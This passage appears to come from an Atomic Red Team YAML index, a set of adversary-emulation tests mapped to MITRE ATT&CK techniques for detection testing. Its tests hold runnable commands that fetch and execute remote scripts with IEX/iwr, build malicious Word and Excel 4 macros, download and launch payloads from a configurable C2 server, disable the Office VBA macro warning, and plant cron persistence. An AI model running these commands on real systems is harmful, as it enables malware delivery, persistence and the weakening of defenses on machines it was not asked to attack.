          default: C:\Users\Public\art.jse
        ms_product:
          description: Maldoc application Word or Excel
          type: string
          default: Word
      dependency_executor_name: powershell
      dependencies:
      - description: 'Microsoft #{ms_product} must be installed

          '
        prereq_command: |
          try {
            New-Object -COMObject "#{ms_product}.Application" | Out-Null
            $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
            Stop-Process -Name $process
            exit 0
          } catch { exit 1 }
        get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
          manually to meet this requirement"

          '
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
          $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
          Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
        name: powershell
    - name: Office launching .bat file from AppData
      auto_generated_guid: 9215ea92-1ded-41b7-9cd6-79f9a78397aa
      description: Microsoft Office creating then launching a .bat script from an
        AppData directory. The .bat file launches calc.exe when opened.
      supported_platforms:
      - windows
      input_arguments:
        bat_path:
          description: Path to malicious .bat file
          type: string
          default: $("$env:temp\art1204.bat")
        ms_product:
          description: Maldoc application Word or Excel
          type: string
          default: Word
      dependency_executor_name: powershell
      dependencies:
      - description: 'Microsoft #{ms_product} must be installed

          '
        prereq_command: |
          try {
            New-Object -COMObject "#{ms_product}.Application" | Out-Null
            $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
            Stop-Process -Name $process
            exit 0
          } catch { exit 1 }
        get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
          manually to meet this requirement"

          '
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
          $macrocode = "   Open `"#{bat_path}`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $bat_path `", vbNormalFocus)`n"
          Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}
        name: powershell
    - name: Excel 4 Macro
      auto_generated_guid: 4ea1fc97-8a46-4b4e-ba48-af43d2a98052
      description: |
        This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a "malicious"
        VBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.

        A note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If
        you'd like to utilize the "=GET.WORKSPACE(26)" method, that many maldoc authors use, you will need to ensure that the User Name associated
        with Excel matches that of the local system. This username can be found under Files -> Options -> Username
      supported_platforms:
      - windows
      input_arguments:
        download_url:
          description: Download URL
          type: string
          default: https://live.sysinternals.com/procexp.exe
        uname:
          description: Username for pathing
          type: string
          default: "$env:Username"
      dependency_executor_name: powershell
      dependencies:
      - description: 'Microsoft Excel must be installed

          '
        prereq_command: |
          try {
            New-Object -COMObject "Excel.Application" | Out-Null
            Stop-Process -Name "Excel"
            exit 0
          } catch { exit 1 }
        get_prereq_command: 'Write-Host "You will need to install Microsoft Excel
          manually to meet this requirement"

          '
      executor:
        command: |
          $fname = "$env:TEMP\atomic_redteam_x4m_exec.vbs"
          $fname1 = "$env:TEMP\procexp.exe"
          if (Test-Path $fname) {
            Remove-Item $fname
            Remove-Item $fname1
          }

          $xlApp = New-Object -COMObject "Excel.Application"
          $xlApp.Visible = $True
          $xlApp.DisplayAlerts = $False
          $xlBook = $xlApp.Workbooks.Add()
          $sheet = $xlBook.Excel4MacroSheets.Add()

          if ("#{uname}" -ne "") {
            $sheet.Cells.Item(1,1) = "#{uname}"
          } else {
            $sheet.Cells.Item(1,1) = "=GET.WORKSPACE(26)"
          }

          $sheet.Cells.Item(2,1) = "procexp.exe"
          $sheet.Cells.Item(3,1) = "atomic_redteam_x4m_exec.vbs"
          $sheet.Cells.Item(4,1) = "=IF(ISNUMBER(SEARCH(`"64`",GET.WORKSPACE(1))), GOTO(A5),)"
          $sheet.Cells.Item(5,1) = "=FOPEN(`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`", 3)"
          $sheet.Cells.Item(6,1) = "=FWRITELN(A5, `"url = `"`"#{download_url}`"`"`")"
          $sheet.Cells.Item(7,1) = "=FWRITELN(A5, `"`")"
          $sheet.Cells.Item(8,1) = "=FWRITELN(A5, `"Set winHttp = CreateObject(`"`"WinHTTP.WinHTTPrequest.5.1`"`")`")"
          $sheet.Cells.Item(9,1) = "=FWRITELN(A5, `"winHttp.Open `"`"GET`"`", url, False`")"
          $sheet.Cells.Item(10,1) = "=FWRITELN(A5, `"winHttp.Send`")"
          $sheet.Cells.Item(11,1) = "=FWRITELN(A5, `"If winHttp.Status = 200 Then`")"
          $sheet.Cells.Item(12,1) = "=FWRITELN(A5, `"Set oStream = CreateObject(`"`"ADODB.Stream`"`")`")"
          $sheet.Cells.Item(13,1) = "=FWRITELN(A5, `"oStream.Open`")"
          $sheet.Cells.Item(14,1) = "=FWRITELN(A5, `"oStream.Type = 1`")"
          $sheet.Cells.Item(15,1) = "=FWRITELN(A5, `"oStream.Write winHttp.responseBody`")"
          $sheet.Cells.Item(16,1) = "=FWRITELN(A5, `"oStream.SaveToFile `"`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`"`", 2`")"
          $sheet.Cells.Item(17,1) = "=FWRITELN(A5, `"oStream.Close`")"
          $sheet.Cells.Item(18,1) = "=FWRITELN(A5, `"End If`")"
          $sheet.Cells.Item(19,1) = "=FCLOSE(A5)"
          $sheet.Cells.Item(20,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`")"
          $sheet.Cells.Item(21,1) = "=WAIT(NOW()+`"00:00:05`")"
          $sheet.Cells.Item(22,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`")"
          $sheet.Cells.Item(23,1) = "=HALT()"
          $sheet.Cells.Item(1,1).Name = "runme"
          $xlApp.Run("runme")
          $xlApp.Quit()

          [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null
          [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null
          [System.GC]::Collect()
          [System.GC]::WaitForPendingFinalizers()

          Remove-Variable xlBook
          Remove-Variable xlApp
        cleanup_command: |
          Stop-Process -Name "procexp*" -ErrorAction Ignore
          Remove-Item "$env:TEMP\atomic_redteam_x4m_exec.vbs" -ErrorAction Ignore
          Remove-Item "$env:TEMP\procexp.exe" -ErrorAction Ignore
        name: powershell
    - name: Headless Chrome code execution via VBA
      auto_generated_guid: a19ee671-ed98-4e9d-b19c-d1954a51585a
      description: |
        This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local
        webserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver
        and pull down the script and execute it. By default the payload will execute calc.exe on the system.
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Microsoft Word must be installed

          '
        prereq_command: |
          try {
            $wdApp = New-Object -COMObject "Word.Application"
            Stop-Process -Name "winword"
            exit 0 } catch { exit 1 }
        get_prereq_command: 'Write-Host "You will need to install Microsoft Word manually
          to meet this requirement"

          '
      - description: 'Google Chrome must be installed

          '
        prereq_command: |
          try {
            $chromeInstalled = (Get-Item (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe').'(Default)').VersionInfo.FileName
            exit 0
          } catch { exit 1 }
        get_prereq_command: 'Write-Host "You will need to install Google Chrome manually
          to meet this requirement"

          '
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
          Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
        name: powershell
        cleanup_command: 'Stop-Process -name mshta

          '
    - name: Potentially Unwanted Applications (PUA)
      auto_generated_guid: 02f35d62-9fdc-4a97-b899-a5d9a876d295
      description: 'The Potentially Unwanted Applications (PUA) protection feature
        in antivirus software can identify and block PUAs from downloading and installing
        on endpoints in your network. These applications are not considered viruses,
        malware, or other types of threats, but might perform actions on endpoints
        that adversely affect their performance or use. This file is similar to EICAR
        test virus file, but is considered a Potentially Unwanted Application (PUA)
        instead of a VIRUS (i.e. not actually malicious, but is flagged as it to verify
        anti-pua protection).

        '
      supported_platforms:
      - windows
      input_arguments:
        pua_url:
          description: url to PotentiallyUnwanted.exe
          type: url
          default: http://amtso.eicar.org/PotentiallyUnwanted.exe
        pua_file:
          description: path to PotentiallyUnwanted.exe
          type: path
          default: "$env:TEMP/PotentiallyUnwanted.exe"
      executor:
        name: powershell
        elevation_required: false
        command: |
          Invoke-WebRequest #{pua_url} -OutFile #{pua_file}
          & "#{pua_file}"
        cleanup_command: |
          Stop-Process -name PotentiallyUnwanted
          Remove-Item #{pua_file} -ErrorAction Ignore
    - name: Office Generic Payload Download
      auto_generated_guid: 5202ee05-c420-4148-bf5e-fd7f7d24850c
      description: |
        This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.
        Required input agruments are c2_domain and file_name
        Execution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
        Example for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder
        Example input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt
      supported_platforms:
      - windows
      input_arguments:
        macro_path:
          description: 'Location of file which will be converted to a VBA macro

            '
          type: path
          default: PathToAtomicsFolder/T1204.002/src/test9-GenericPayloadDownload.txt
        c2_domain:
          description: 'This required variable points to a user defined HTTP server
            that will host the file_name in the c2_parent_directory.

            '
          type: url
          default: 
        c2_parent_directory:
          description: |
            Parent directory where you have the "malicious" file on c2_domain server.
            Will default to root directory. Forward slashes are not needed at begining or ending of directory path
          type: path
          default: ''
        file_name:
          description: |
            "Malicious" file to be downloaded.
            This required file needs to be place on the user provided c2 domain
            Example file can be found at PathToAtomicsFolder/T1204.002/src/test9-example-payload.txt
          type: string
          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt
        ms_product:
          description: 'Maldoc application Word or Excel

            '
          type: string
          default: Word
      dependency_executor_name: powershell
      dependencies:
      - description: 'Destination c2_domain name or IP address must be set to a running
          HTTP server.

          '
        prereq_command: 'if (#{c2_domain}) (exit 0) else (exit 1)

          '
        get_prereq_command: 'Write-Host "Destination c2 server domain name or IP address
          must be set and reachable for HTTP service"

          '
      - description: 'Microsoftt #{ms_product} must be installed

          '
        prereq_command: |
          try {
            New-Object -COMObject "#{ms_product}.Application" | Out-Null
            $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
            Stop-Process -Name $process
            exit 0
          } catch { exit 1 }
        get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
          manually to meet this requirement"

          '
      executor:
        name: powershell
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
          $macroCode = Get-Content "#{macro_path}" -Raw
          $URL = "#{c2_domain}" + "/" + "#{c2_parent_directory}"
          $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', "#{file_name}"
          Invoke-MalDoc -macroCode $macroCode -officeProduct "#{ms_product}"
        cleanup_command: 'Remove-Item "C:\Users\$env:username\Desktop\#{file_name}"
          -ErrorAction Ignore

          '
    - name: LNK Payload Download
      auto_generated_guid: 581d7521-9c4b-420e-9695-2aec5241167f
      description: This lnk files invokes powershell to download putty from the internet
        and opens the file. https://twitter.com/ankit_anubhav/status/1518932941090410496
      supported_platforms:
      - windows
      executor:
        command: |
          Invoke-WebRequest -OutFile $env:Temp\test10.lnk "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"
          $file1 = "$env:Temp\test10.lnk"
          Start-Process $file1
          Start-Sleep -s 10
          taskkill /IM a.exe /F
        cleanup_command: |-
          $file1 = "$env:Temp\test10.lnk"
          $file2 = "$env:Temp\a.exe"
          Remove-Item $file1 -ErrorAction Ignore
          Remove-Item $file2 -ErrorAction Ignore
        name: powershell
    - name: Mirror Blast Emulation
      auto_generated_guid: 24fd9719-7419-42dd-bce6-ab3463110b3c
      description: "Emulates the JS -> MSI chain of the MirrorBlast T505 campaign
        by executing an xlsm file designed. \nRequires the 32 bit version of Office
        to run. [MirrorBlast Campaign Analysis](https://blog.morphisec.com/explosive-new-mirrorblast-campaign-targets-financial-companies)\n"
      supported_platforms:
      - windows
      executor:
        command: |-
          Cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs"
          New-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security -Name "VBAWarnings" -Value "1" -PropertyType DWORD -Force | Out-Null
          & '.\Excel 2016.lnk' PathToAtomicsFolder\T1204.002\bin\mirrorblast_emulation.xlsm
        cleanup_command: reg delete "HKCU\SOFTWARE\Microsoft\Office\16.0\Excel\Security"
          /v "VBAWarnings" /f
        name: powershell
  T1053.003:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--2acf44aa-542f-4366-b4eb-55ef5747759c
      type: attack-pattern
      created: '2019-12-03T14:25:00.538Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1053.003
        url: https://attack.mitre.org/techniques/T1053/003
      - source_name: 20 macOS Common Tools and Techniques
        url: https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/
        description: Phil Stokes. (2021, February 16). 20 Common Tools & Techniques
          Used by macOS Threat Actors & Malware. Retrieved August 23, 2021.
      modified: '2022-03-24T17:33:03.443Z'
      name: 'Scheduled Task/Job: Cron'
      description: "Adversaries may abuse the <code>cron</code> utility to perform
        task scheduling for initial or recurring execution of malicious code.(Citation:
        20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based
        job scheduler for Unix-like operating systems.  The <code> crontab</code>
        file contains the schedule of cron entries to be run and the specified times
        for execution. Any <code>crontab</code> files are stored in operating system-specific
        file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments
        to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: privilege-escalation
      x_mitre_detection: "Monitor scheduled task creation from common utilities using
        command-line invocation. Legitimate scheduled tasks may be created during
        installation of new software or through system administration functions. Look
        for changes to tasks that do not correlate with known software, patch cycles,
        etc.  \n\nSuspicious program execution through scheduled tasks may show up
        as outlier processes that have not been seen before when compared against
        historical data. Data and events should not be viewed in isolation, but as
        part of a chain of behavior that could lead to other activities, such as network
        connections made for Command and Control, learning details about the environment
        through Discovery, and Lateral Movement. "
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      - 'Scheduled Job: Scheduled Job Creation'
      - 'File: File Modification'
      x_mitre_permissions_required:
      - User
      identifier: T1053.003
    atomic_tests:
    - name: Cron - Replace crontab with referenced file
      auto_generated_guid: 435057fb-74b1-410e-9403-d81baf194f75
      description: 'This test replaces the current user''s crontab file with the contents
        of the referenced file. This technique was used by numerous IoT automated
        exploitation attacks.

        '
      supported_platforms:
      - macos
      - linux
      input_arguments:
        command:
          description: Command to execute
          type: string
          default: "/tmp/evil.sh"
        tmp_cron:
          description: Temporary reference file to hold evil cron schedule
          type: path
          default: "/tmp/persistevil"
      executor:
        name: bash
        command: |
          crontab -l > /tmp/notevil
          echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
        cleanup_command: 'crontab /tmp/notevil

          '
    - name: Cron - Add script to all cron subfolders
      auto_generated_guid: b7d42afa-9086-4c8a-b7b0-8ea3faa6ebb0
      description: 'This test adds a script to /etc/cron.hourly, /etc/cron.daily,
        /etc/cron.monthly and /etc/cron.weekly folders configured to execute on a
        schedule. This technique was used by the threat actor Rocke during the exploitation
        of Linux web servers.

        '
      supported_platforms:
      - macos
      - linux
      input_arguments:
        command:
          description: Command to execute
          type: string
          default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
        cron_script_name:
          description: Name of file to store in cron folder
          type: string
          default: persistevil
      executor:
        elevation_required: true
        name: bash
        command: |
          echo "#{command}" > /etc/cron.daily/#{cron_script_name}
          echo "#{command}" > /etc/cron.hourly/#{cron_script_name}
          echo "#{command}" > /etc/cron.monthly/#{cron_script_name}
          echo "#{command}" > /etc/cron.weekly/#{cron_script_name}
        cleanup_command: |
          rm /etc/cron.daily/#{cron_script_name}
          rm /etc/cron.hourly/#{cron_script_name}
          rm /etc/cron.monthly/#{cron_script_name}
          rm /etc/cron.weekly/#{cron_script_name}
    - name: Cron - Add script to /var/spool/cron/crontabs/ folder
      auto_generated_guid: 2d943c18-e74a-44bf-936f-25ade6cccab4
      description: 'This test adds a script to a /var/spool/cron/crontabs folder configured
        to execute on a schedule. This technique was used by the threat actor Rocke
        during the exploitation of Linux web servers.

        '
      supported_platforms:
      - linux
      input_arguments:
        command:
          description: Command to execute
          type: string
          default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
        cron_script_name:
          description: Name of file to store in /var/spool/cron/crontabs folder
          type: string
          default: persistevil
      executor:
        elevation_required: true
        name: bash
        command: 'echo "#{command}" >> /var/spool/cron/crontabs/#{cron_script_name}

          '
        cleanup_command: 'rm /var/spool/cron/crontabs/#{cron_script_name}

          '
  T1559.001:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--2f6b4ed7-fef1-44ba-bcb8-1b4beb610b64
      type: attack-pattern
      created: '2020-02-12T14:09:53.107Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1559.001
        url: https://attack.mitre.org/techniques/T1559/001
      - source_name: Fireeye Hunting COM June 2019
        url: https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html
        description: Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June
          10, 2019.
      - url: https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx
        description: Microsoft. (n.d.). Component Object Model (COM). Retrieved November
          22, 2017.
        source_name: Microsoft COM
      - url: https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html
        description: 'Forshaw, J. (2018, April 18). Windows Exploitation Tricks: Exploiting
          Arbitrary File Writes for Local Elevation of Privilege. Retrieved May 3,
          2018.'
        source_name: ProjectZero File Write EoP Apr 2018
      - url: https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/
        description: Nelson, M. (2017, November 16). Lateral Movement using Outlook's
          CreateObject Method and DotNetToJScript. Retrieved November 21, 2017.
        source_name: Enigma Outlook DCOM Lateral Movement Nov 2017
      - url: https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
        description: Nelson, M. (2017, January 5). Lateral Movement using the MMC20
          Application COM Object. Retrieved November 21, 2017.
        source_name: Enigma MMC20 COM Jan 2017
      modified: '2021-07-26T22:51:20.448Z'
      name: Component Object Model
      description: |-
        Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)

        Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: "Monitor for COM objects loading DLLs and other modules not
        typically associated with the application.(Citation: Enigma Outlook DCOM Lateral
        Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012)
        or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed
        malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20
        COM Jan 2017)\n\nMonitor for spawning of processes associated with COM objects,
        especially those invoked by a user different than the one currently logged
        on. "
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Script: Script Execution'
      - 'Module: Module Load'
      x_mitre_remote_support: true
    atomic_tests: []
  T1053:
    technique:
      modified: '2023-03-30T21:01:52.697Z'
      name: Scheduled Task/Job
      description: |-
        Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)

        Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.(Citation: ProofPoint Serpent)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: privilege-escalation
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_contributors:
      - Prashant Verma, Paladion
      - Leo Loobeek, @leoloobeek
      - Travis Smith, Tripwire
      - Alain Homewood, Insomnia Security
      - Andrew Northern, @ex_raritas
      - Bryan Campbell, @bry_campbell
      - Zachary Abzug, @ZackDoesML
      - Selena Larson, @selenalarson
      x_mitre_deprecated: false
      x_mitre_detection: "Monitor scheduled task creation from common utilities using
        command-line invocation. Legitimate scheduled tasks may be created during
        installation of new software or through system administration functions. Look
        for changes to tasks that do not correlate with known software, patch cycles,
        etc. \n\nSuspicious program execution through scheduled tasks may show up
        as outlier processes that have not been seen before when compared against
        historical data. Data and events should not be viewed in isolation, but as
        part of a chain of behavior that could lead to other activities, such as network
        connections made for Command and Control, learning details about the environment
        through Discovery, and Lateral Movement."
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - Linux
      - macOS
      - Containers
      x_mitre_version: '2.2'
      x_mitre_data_sources:
      - 'File: File Modification'
      - 'Scheduled Job: Scheduled Job Creation'
      - 'Process: Process Creation'
      - 'Container: Container Creation'
      - 'Command: Command Execution'
      - 'File: File Creation'
      x_mitre_effective_permissions:
      - SYSTEM
      - Administrator
      - User
      x_mitre_permissions_required:
      - Administrator
      - SYSTEM
      - User
      x_mitre_remote_support: true
      type: attack-pattern
      id: attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9
      created: '2017-05-31T21:30:46.977Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1053
        external_id: T1053
      - source_name: ProofPoint Serpent
        description: Campbell, B. et al. (2022, March 21). Serpent, No Swiping! New
          Backdoor Targets French Entities with Unique Attack Chain. Retrieved April
          11, 2022.
        url: https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain
      - source_name: TechNet Task Scheduler Security
        description: Microsoft. (2005, January 21). Task Scheduler and security. Retrieved
          June 8, 2016.
        url: https://technet.microsoft.com/en-us/library/cc785125.aspx
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
    atomic_tests: []
  T1059.002:
    technique:
      modified: '2022-10-19T15:37:28.071Z'
      name: 'Command and Scripting Interpreter: AppleScript'
      description: |-
        Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.

        Scripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e "script here"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.(Citation: SentinelOne AppleScript)

        AppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s <code>NSAppleScript</code> or <code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.

        Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team) Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation: Macro Malware Targets Macs)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: |-
        Monitor for execution of AppleScript through <code>osascript</code> and usage of the <code>NSAppleScript</code> and <code>OSAScript</code> APIs that may be related to other suspicious behavior occurring on the system. Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.

        Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.
      x_mitre_platforms:
      - macOS
      x_mitre_is_subtechnique: true
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '1.1'
      x_mitre_contributors:
      - Phil Stokes, SentinelOne
      x_mitre_data_sources:
      - 'Process: OS API Execution'
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      x_mitre_remote_support: false
      type: attack-pattern
      id: attack-pattern--37b11151-1776-4f8f-b328-30939fbf2ceb
      created: '2020-03-09T14:07:54.329Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1059/002
        external_id: T1059.002
      - source_name: Apple AppleScript
        description: Apple. (2016, January 25). Introduction to AppleScript Language
          Guide. Retrieved March 28, 2020.
        url: https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/introduction/ASLR_intro.html
      - source_name: SentinelOne macOS Red Team
        description: 'Phil Stokes. (2019, December 5). macOS Red Team: Calling Apple
          APIs Without Building Binaries. Retrieved July 17, 2020.'
        url: https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/
      - source_name: SentinelOne AppleScript
        description: Phil Stokes. (2020, March 16). How Offensive Actors Use AppleScript
          For Attacking macOS. Retrieved July 17, 2020.
        url: https://www.sentinelone.com/blog/how-offensive-actors-use-applescript-for-attacking-macos/
      - source_name: Macro Malware Targets Macs
        description: Yerko Grbic. (2017, February 14). Macro Malware Targets Macs.
          Retrieved July 8, 2017.
        url: https://www.mcafee.com/blogs/other-blogs/mcafee-labs/macro-malware-targets-macs/
      object_marking_refs:
